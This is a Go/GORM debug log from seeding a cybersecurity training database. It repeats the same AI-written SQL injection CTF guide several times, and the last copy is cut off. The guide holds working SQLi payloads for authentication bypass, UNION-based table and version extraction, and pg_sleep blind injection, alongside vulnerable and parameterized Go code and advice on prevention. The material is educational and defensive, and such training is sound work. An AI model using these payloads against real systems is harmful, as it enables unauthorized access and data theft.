In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,70) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.423ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.634ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.045','2025-06-09 14:07:55.045',NULL,'cyber security and khvkb','tlVTbCcOyKoWioVhJlQWsPcsFxxHzeyOlQfcKvAOdoOKeBHCEssyrVxZEjciVmLfYQJLTGGsnYbxchyWdBrGOeIrEXeXAONqBifQ',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.522ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.133ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 71 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.771ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.054','2025-06-09 14:07:55.054',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,71) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.469ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.014ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.062','2025-06-09 14:07:55.062',NULL,'cyber security and sbgjr','gcNJumoGyanuQlrRaEVnvkYulXGhBzZxAwJTUtbWTwjinlgpAJazgOrTdMyMGkgGTWnSJDhrBuZSBwiJKVPRQTivsbPWMRcRxavj',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.511ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.637ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 72 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[12.502ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.07','2025-06-09 14:07:55.07',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,72) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.436ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.575ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.082','2025-06-09 14:07:55.082',NULL,'cyber security and zeykc','LsdNIEKOrmFiBfVAecUpjblXAprFqdWpmwyZvGUcYRTAWlWMjluGNHUZutQfutVtCgkEqukZtfhwcJKGtTqnJTSAkTzLJiPUraqB',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.503ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.516ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 73 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[16.605ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.089','2025-06-09 14:07:55.089',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,73) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.560ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[9.719ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.107','2025-06-09 14:07:55.107',NULL,'cyber security and lkxhd','dKvAVVqvcngEZNxfnCpaxMfpzEQOYnJlqLEOZPphHmwobIGSPhPEynZEDvAXpzabCipKPnilRqdFlzlDbjuOiCNiZaNYPJVLjHWf',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.487ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.465ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 74 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.133ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.116','2025-06-09 14:07:55.116',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,74) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.452ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[9.271ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.127','2025-06-09 14:07:55.127',NULL,'cyber security and aeamq','BDsoVraUzflfiZrOeVRbLqONpHEpnldWxEkzffZOzaqpWWvBEiNjRqpjEHNwVTdqMIgSLrndTkHJCcoPaIaRIOkvoLfUCDrQwalL',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.548ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.456ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 75 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.703ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.135','2025-06-09 14:07:55.135',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
